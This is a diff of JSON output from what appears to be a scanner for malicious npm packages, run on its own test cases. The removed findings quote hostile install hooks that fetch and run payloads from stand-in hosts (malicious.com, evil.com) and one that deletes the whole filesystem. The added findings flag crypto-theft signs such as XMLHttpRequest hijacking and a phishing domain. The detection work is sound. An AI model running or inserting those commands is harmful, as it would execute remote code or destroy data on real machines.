@@ -1,90 +1,45 @@
 {
-  "scan_path": "tests/test-cases/postinstall-hooks-test/",
-  "start_time": "2025-09-28T02:11:32.367827600Z",
-  "end_time": "2025-09-28T02:11:32.370586Z",
-  "duration_seconds": 0.002,
-  "timestamp": "2025-09-28T02:11:32.367827600Z",
+  "scan_path": "tests/test-cases/crypto-theft-test/",
+  "start_time": "2025-09-28T02:38:17.733985100Z",
+  "end_time": "2025-09-28T02:38:17.766910400Z",
+  "duration_seconds": 0.032,
+  "timestamp": "2025-09-28T02:38:17.733985100Z",
   "files_scanned": 0,
   "results": [
     {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
-      "risk_level": "Medium",
-      "comment": "Contains suspicious packages: Known typosquatting of 'express': express (missing character (s))",
-      "patterns_detected": [
-        "typosquatting"
-      ],
-      "details": [
-        "Known typosquatting of 'express': express (missing character (s))"
-      ]
-    },
-    {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
-      "risk_level": "Medium",
-      "comment": "Suspicious patterns detected: Potential typosquatting package detected",
-      "patterns_detected": [
-        "typosquatting_detection"
-      ],
-      "details": [
-        "typosquatting_detection: Potential typosquatting package detected"
-      ]
-    },
-    {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
+      "file": "tests/test-cases/crypto-theft-test/malicious.js",
       "risk_level": "High",
-      "comment": "Suspicious postinstall hook detected: curl -s https://malicious.com/payload | bash",
+      "comment": "Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected",
       "patterns_detected": [
-        "suspicious_postinstall_hook"
+        "xmlhttprequest_modification",
+        "attacker_wallet",
+        "npmjs_help",
+        "ethereum_addresses"
       ],
       "details": [
-        "Postinstall command: curl -s https://malicious.com/payload | bash",
-        "Suspicious pattern: curl",
-        "Postinstall hooks can execute arbitrary code during package installation"
+        "xmlhttprequest_modification: XMLHttpRequest prototype modification detected",
+        "attacker_wallet: Known attacker wallet address detected - HIGH RISK",
+        "npmjs_help: Phishing domain npmjs.help detected",
+        "ethereum_addresses: Ethereum wallet address patterns detected"
       ]
     },
     {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
-      "risk_level": "Medium",
-      "comment": "Suspicious install hook detected: node -e \"require('child_process').exec('rm -rf /')\"",
+      "file": "tests/test-cases/crypto-theft-test/malicious.js",
+      "risk_level": "High",
+      "comment": "Cryptocurrency theft pattern: XMLHttpRequest prototype modification detected",
       "patterns_detected": [
-        "suspicious_lifecycle_hook"
+        "xmlhttprequest_hijacking"
       ],
       "details": [
-        "Hook type: install",
-        "Command: node -e \"require('child_process').exec('rm -rf /')\"",
-        "Suspicious pattern: node -e"
-      ]
-    },
-    {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
-      "risk_level": "Medium",
-      "comment": "Suspicious preinstall hook detected: wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh",
-      "patterns_detected": [
-        "suspicious_lifecycle_hook"
-      ],
-      "details": [
-        "Hook type: preinstall",
-        "Command: wget -O /tmp/malware.sh https://evil.com/malware && bash /tmp/malware.sh",
-        "Suspicious pattern: wget"
-      ]
-    },
-    {
-      "file": "tests/test-cases/postinstall-hooks-test/package.json",
-      "risk_level": "Medium",
-      "comment": "Suspicious prepare hook detected: eval $(echo 'malicious code here')",
-      "patterns_detected": [
-        "suspicious_lifecycle_hook"
-      ],
-      "details": [
-        "Hook type: prepare",
-        "Command: eval $(echo 'malicious code here')",
-        "Suspicious pattern: eval"
+        "XMLHttpRequest prototype modification is a common crypto theft technique",
+        "This pattern was used in the September 8, 2025 chalk/debug attack"
       ]
     }
   ],
   "summary": {
-    "high_risk_count": 1,
-    "medium_risk_count": 5,
+    "high_risk_count": 2,
+    "medium_risk_count": 0,
     "low_risk_count": 0,
-    "total_issues": 6
+    "total_issues": 2
   }
 }
